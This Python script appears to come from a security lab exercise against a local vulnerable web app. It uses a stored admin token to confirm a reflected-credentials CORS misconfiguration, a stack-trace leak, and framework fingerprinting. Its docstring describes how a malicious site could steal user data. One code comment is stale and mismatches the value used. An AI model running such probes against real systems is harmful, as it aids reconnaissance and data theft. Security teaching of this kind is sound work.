#!/usr/bin/env python3
"""
cors_abuse.py — VULN-06: Security Misconfiguration (CORS + Stack Traces)

Two misconfigurations are demonstrated here:

  A) CORS origin: true
     The backend sets `origin: true` in its CORS config, which reflects
     whatever Origin header the client sends back as
     Access-Control-Allow-Origin, combined with
     Access-Control-Allow-Credentials: true.

     In a browser, this means ANY website can make credentialed
     cross-origin requests to the API and read the response — the
     same-origin policy, which exists to prevent exactly this, is
     completely bypassed. A malicious page at https://evil-site.com
     could silently call GET /api/users, read the response, and
     exfiltrate user data to an attacker-controlled server.

     From a Python script we simulate this by sending a forged Origin
     header and confirming the server echoes it back in
     Access-Control-Allow-Origin.

  B) Verbose error / stack trace exposure
     All four error handlers in userController.js were modified to
     include `error.stack` in the JSON response. Triggering a 500
     exposes full file paths, internal library names, and line numbers
     — information that significantly aids further exploitation by
     revealing the server's directory structure and framework versions.

     We trigger this by sending a malformed MongoDB ObjectId as :id
     (a valid-length hex string that isn't a real user) which causes
     a CastError inside Mongoose, surfaced with a full stack trace.

Usage:
    python cors_abuse.py
"""

import json
import os
import sys

import requests

DEFAULT_BASE_URL = "http://localhost:5001"
USERS_PATH = "/api/users"
LOGIN_PATH = "/api/auth/login"
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
ESCALATED_ACCOUNT_FILE = os.path.join(SCRIPT_DIR, "escalated_admin_account.json")

FORGED_ORIGIN = "https://evil-site.com"
# A well-formed 24-hex-char string that is not a real MongoDB ObjectId
# — triggers a Mongoose CastError → 500 with stack trace
# BAD_OBJECT_ID = "aaaaaaaaaaaaaaaaaaaaaaaa"
BAD_OBJECT_ID = "notavalidid"

def load_admin_session() -> dict:
    if not os.path.exists(ESCALATED_ACCOUNT_FILE):
        print(f"[!] {ESCALATED_ACCOUNT_FILE} not found.", file=sys.stderr)
        print("    Run mass_assignment.py first.", file=sys.stderr)
        sys.exit(1)
    with open(ESCALATED_ACCOUNT_FILE) as f:
        return json.load(f)


def run(base_url: str = DEFAULT_BASE_URL):
    session = load_admin_session()
    token = session["token"]
    base = base_url.rstrip("/")

    # -------------------------------------------------------------------
    # Part A — CORS: forged Origin reflected back
    # -------------------------------------------------------------------
    print("=" * 65)
    print("Part A — CORS origin: true (reflects any origin)")
    print("=" * 65)
    print(f"[*] Sending GET {USERS_PATH} with forged Origin: {FORGED_ORIGIN}")

    r = requests.get(
        f"{base}{USERS_PATH}",
        headers={
            "Authorization": f"Bearer {token}",
            "Origin": FORGED_ORIGIN,
        },
        timeout=10,
    )

    acao = r.headers.get("Access-Control-Allow-Origin", "(not present)")
    acac = r.headers.get("Access-Control-Allow-Credentials", "(not present)")

    print(f"[*] Response headers:")
    print(f"    Access-Control-Allow-Origin      : {acao}")
    print(f"    Access-Control-Allow-Credentials : {acac}")
    print()

    if acao == FORGED_ORIGIN and acac.lower() == "true":
        print("[+] CORS MISCONFIGURATION CONFIRMED:")
        print(f"    Server reflected the forged origin '{FORGED_ORIGIN}' back")
        print("    with credentials: true.")
        print()
        print("    Real-world impact: any page at https://evil-site.com can")
        print("    make a credentialed fetch() to this API and read the full")
        print("    response — including the user list with password hashes.")
        print("    The browser's same-origin policy provides zero protection.")
    else:
        print(f"[!] Expected ACAO={FORGED_ORIGIN}, ACAC=true")
        print(f"    Got ACAO={acao}, ACAC={acac}")
        print("    CORS may have been patched or config differs.")

    print()

    # -------------------------------------------------------------------
    # Part B — Stack trace exposure via malformed :id
    # -------------------------------------------------------------------
    print("=" * 65)
    print("Part B — Verbose error / stack trace exposure")
    print("=" * 65)
    print(f"[*] Sending GET {USERS_PATH}/{BAD_OBJECT_ID} (malformed ObjectId)")
    print(f"    This triggers a Mongoose CastError → 500 error handler")

    r = requests.get(
        f"{base}{USERS_PATH}/{BAD_OBJECT_ID}",
        headers={"Authorization": f"Bearer {token}"},
        timeout=10,
    )

    print(f"[*] HTTP {r.status_code}")
    print()

    try:
        body = r.json()
    except Exception:
        body = {}

    stack = body.get("stack") or body.get("error") or ""

    if r.status_code >= 500 and stack:
        print("[+] STACK TRACE EXPOSURE CONFIRMED:")
        print("    Server returned a stack trace in the JSON response body.")
        print()
        # Print the stack trace with indentation for readability
        for line in stack.split("\\n")[:12]:
            print(f"    {line}")
        print()
        print("    Information disclosed:")
        print("    - Full server-side file paths (reveals directory structure)")
        print("    - Internal framework/library names and versions")
        print("    - Exact source line numbers (aids targeted exploitation)")
    elif r.status_code >= 400:
        print(f"[*] Got HTTP {r.status_code} but no stack trace in response body.")
        print(f"    Body: {r.text[:300]}")
        print("    Stack trace exposure may have been patched.")
    else:
        print(f"[!] Unexpected HTTP {r.status_code} — {r.text[:200]}")

    print()

    # -------------------------------------------------------------------
    # Bonus — X-Powered-By header fingerprinting
    # -------------------------------------------------------------------
    print("=" * 65)
    print("Bonus — X-Powered-By header (framework fingerprinting)")
    print("=" * 65)
    r = requests.get(f"{base}{USERS_PATH}",
                     headers={"Authorization": f"Bearer {token}"}, timeout=10)
    xpb = r.headers.get("X-Powered-By", "(not present)")
    print(f"[*] X-Powered-By: {xpb}")
    if xpb != "(not present)":
        print("[+] Framework fingerprint confirmed — attacker knows the exact")
        print("    server technology without any active probing.")
    else:
        print("[*] Header not present — may have been disabled.")


if __name__ == "__main__":
    run()
    